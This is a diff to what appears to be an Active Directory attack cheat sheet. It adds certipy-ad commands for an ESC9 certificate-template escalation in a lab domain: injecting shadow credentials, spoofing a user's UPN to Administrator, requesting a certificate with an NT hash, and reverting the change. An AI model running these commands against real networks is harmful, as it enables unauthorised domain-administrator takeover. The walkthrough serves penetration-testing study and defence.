@@ -328,8 +328,10 @@ certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-
 - Gain access to a writable account (proxy),(you must have `GenericWrite` over it) by injecting a shadow credential:
 
 ```bash
-'
+certipy-ad shadow auto -u dev -p 'password' -account "matt" -dc-ip 192.168.130.136 -debug 
 ```
+
+<img width="1661" height="976" alt="image" src="https://github.com/user-attachments/assets/f682a65f-d502-4ef7-9009-cb97a44fa8d1" />
 
 
 - Spoof UPN of Proxy account-:
@@ -338,4 +340,22 @@ certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-
 certipy-ad account update -u 'dev' -p 'password' -dc-ip 192.168.130.136 -user 'matt' -upn 'Administrator@domain.local'
 ```
 <img width="1398" height="184" alt="image" src="https://github.com/user-attachments/assets/09b5c4b5-61e9-4eb6-83e3-41e286866f00" />
- 
+
+ - Request cert as administrator with the target user's hash using the vulnerable template-:
+
+```bash
+certipy-ad req -u matt@papa.local -hashes e8cd0e4a9e89eab931dc5338fcbec54a  -ca LAB-ROOT-CA -template ESC9 -dc-ip 192.168.130.136
+```
+
+<img width="1391" height="344" alt="image" src="https://github.com/user-attachments/assets/5561c171-fa6a-4283-8b14-1d8158e906e0" />
+
+-  Revert UPN changes-:
+
+```bash
+certipy-ad account update -u dev@papa.local -password 'password' -user 'matt' -upn matt@papa.local -dc-ip 192.168.130.136
+```
+
+<img width="1342" height="217" alt="image" src="https://github.com/user-attachments/assets/f595af7c-d5d8-40d0-9712-bbcea6be707c" />
+
+
+
